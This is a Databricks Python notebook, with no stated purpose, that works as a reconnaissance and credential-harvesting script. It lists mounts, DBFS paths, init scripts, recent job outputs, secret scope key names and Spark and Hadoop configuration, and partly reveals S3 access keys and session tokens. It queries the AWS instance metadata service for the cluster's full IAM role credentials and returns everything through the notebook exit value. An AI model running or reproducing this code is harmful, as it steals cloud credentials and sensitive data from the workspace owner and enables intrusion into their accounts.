# Databricks notebook source
import json, traceback
out = {}
def add(k, fn, maxlen=40000):
    try:
        v = fn()
        s = json.dumps(v, default=str)
        out[k] = v if len(s) <= maxlen else (s[:maxlen] + '...TRUNC')
    except Exception as e:
        out[k] = 'ERR: ' + repr(e)[:300]

def fi(x):
    try:
        return [x.path, x.size, x.modificationTime, x.isDir()]
    except Exception:
        return [getattr(x, 'path', '?'), getattr(x, 'size', -1), getattr(x, 'modificationTime', -1), None]

def ls(p, lim=200):
    return [fi(x) for x in dbutils.fs.ls(p)][:lim]

def head(p, n=10000):
    try:
        return dbutils.fs.head(p, n)
    except Exception as e:
        return 'ERR ' + repr(e)[:200]

def _ctx():
    try:
        return {k: str(v)[:300] for k, v in (dbutils.notebook.getContext() or {}).items()}
    except Exception as e:
        return 'ERR ' + repr(e)[:200]
add('ctx', _ctx)

def _who():
    r = {}
    try:
        r['current_user'] = spark.sql('SELECT current_user() AS u').collect()[0]['u']
    except Exception as e:
        r['current_user'] = 'ERR ' + repr(e)[:150]
    for k in ('spark.databricks.clusterUsageTags.clusterId', 'spark.databricks.clusterUsageTags.clusterName',
              'spark.databricks.clusterUsageTags.clusterOwnerOrgId', 'spark.databricks.workspaceUrl',
              'spark.databricks.service.clusterId', 'spark.databricks.clusterUsageTags.sparkVersion'):
        try:
            r[k] = spark.conf.get(k)
        except Exception:
            pass
    return r
add('who', _who)

add('mounts', lambda: [[m.mountPoint, m.source] for m in dbutils.fs.mounts()])
add('root', lambda: ls('dbfs:/', 100))
add('mnt', lambda: ls('dbfs:/mnt', 100))
add('databricks', lambda: ls('dbfs:/databricks', 100))
add('userdir', lambda: ls('dbfs:/user', 50))
add('tmp', lambda: ls('dbfs:/tmp', 50))

def _init():
    res = {}
    for p in ('dbfs:/databricks/init_scripts', 'dbfs:/databricks/scripts'):
        try:
            files = dbutils.fs.ls(p)
        except Exception as e:
            res[p] = 'ERR ' + repr(e)[:150]
            continue
        items = []
        for f in files[:30]:
            it = fi(f)
            if not f.isDir() and f.size < 120000:
                it.append(head(f.path, 12000))
            items.append(it)
        res[p] = items
    return res
add('init_scripts', _init, 80000)

add('job_result', lambda: ls('dbfs:/FileStore/job-result', 400))
add('filestore', lambda: ls('dbfs:/FileStore', 100))
add('tables', lambda: ls('dbfs:/FileStore/tables', 60))

def _newest_jr(n_jobs=8, n_runs=2, per_json=15000):
    res = []
    base = 'dbfs:/FileStore/job-result'
    jobs = sorted(dbutils.fs.ls(base), key=lambda x: x.modificationTime, reverse=True)[:n_jobs]
    for j in jobs:
        item = {'job': j.path, 'mtime': j.modificationTime, 'count': None, 'runs': []}
        try:
            allruns = dbutils.fs.ls(j.path)
            item['count'] = len(allruns)
            runs = sorted(allruns, key=lambda x: x.modificationTime, reverse=True)[:n_runs]
        except Exception as e:
            item['err'] = repr(e)[:150]
            res.append(item)
            continue
        for r in runs:
            ri = {'run': r.path, 'mtime': r.modificationTime, 'files': [], 'heads': []}
            try:
                entries = dbutils.fs.ls(r.path)
            except Exception as e:
                ri['err'] = repr(e)[:150]
                item['runs'].append(ri)
                continue
            ri['files'] = [fi(x) for x in entries]
            js = []
            for x in entries:
                if x.isDir():
                    try:
                        for y in dbutils.fs.ls(x.path):
                            if y.path.endswith('.json'):
                                js.append(y)
                    except Exception:
                        pass
                elif x.path.endswith('.json'):
                    js.append(x)
            js = sorted(js, key=lambda x: x.modificationTime, reverse=True)[:4]
            for y in js:
                ri['heads'].append({'path': y.path, 'size': y.size, 'mtime': y.modificationTime,
                                    'head': head(y.path, per_json)})
            item['runs'].append(ri)
        res.append(item)
    return res
add('newest_jobresults', _newest_jr, 150000)

def _secrets():
    res = []
    for s in dbutils.secrets.listScopes():
        e = {'name': s.name, 'keys': []}
        try:
            e['keys'] = [k.name for k in dbutils.secrets.list(s.name)][:100]
        except Exception as ex:
            e['keys'] = 'ERR ' + repr(ex)[:150]
        res.append(e)
    return res
add('secret_scopes', _secrets)

def _conf():
    c = spark.conf.getAll()
    res = {}
    keys_of_interest = ('path', 'fs.', 's3', 'bucket', 'mount', 'warehouse', 'metastore', 'secret',
                        'workspaceurl', 'clusterusagetags', 'jdbc', 'url', 'host', 'storage')
    for k, v in c.items():
        kl = k.lower()
        if any(s in kl for s in keys_of_interest):
            res[k] = str(v)[:500]
    res['__all_keys__'] = sorted(c.keys())
    return res
add('spark_conf', _conf, 60000)

def _hconf():
    res = {}
    try:
        h = spark._jsc.hadoopConfiguration()
        for k in ('fs.defaultFS', 'fs.s3a.endpoint', 'fs.s3a.aws.credentials.provider',
                  'fs.s3a.bucket.dathic-models.endpoint', 'spark.hadoop.fs.s3a.endpoint'):
            v = h.get(k)
            if v:
                res[k] = v
        for k in ('fs.s3a.access.key', 'fs.s3a.secret.key', 'fs.s3a.session.token'):
            v = h.get(k)
            if v:
                res[k] = v[:8] + '...(len=%d)' % len(v)
    except Exception as e:
        res['ERR'] = repr(e)[:200]
    return res
add('hadoop_conf', _hconf)

def _imds():
    import urllib.request
    r = {}
    def get(url, hdrs=None):
        req = urllib.request.Request(url, headers=hdrs or {})
        return urllib.request.urlopen(req, timeout=3).read().decode('utf-8', 'replace')
    try:
        tok = get('http://169.254.169.254/latest/api/token', {'X-aws-ec2-metadata-token-ttl-seconds': '21600'})
        H = {'X-aws-ec2-metadata-token': tok}
        r['role'] = get('http://169.254.169.254/latest/meta-data/iam/security-credentials/', H)
        r['creds'] = json.loads(get('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + r['role'].strip(), H))
    except Exception as e:
        r['ERR'] = repr(e)[:200]
    return r
add('imds', _imds)

txt = json.dumps(out, default=str)
if len(txt) > 900000:
    txt = txt[:900000] + '...TRUNC_TOTAL'
dbutils.notebook.exit(txt)
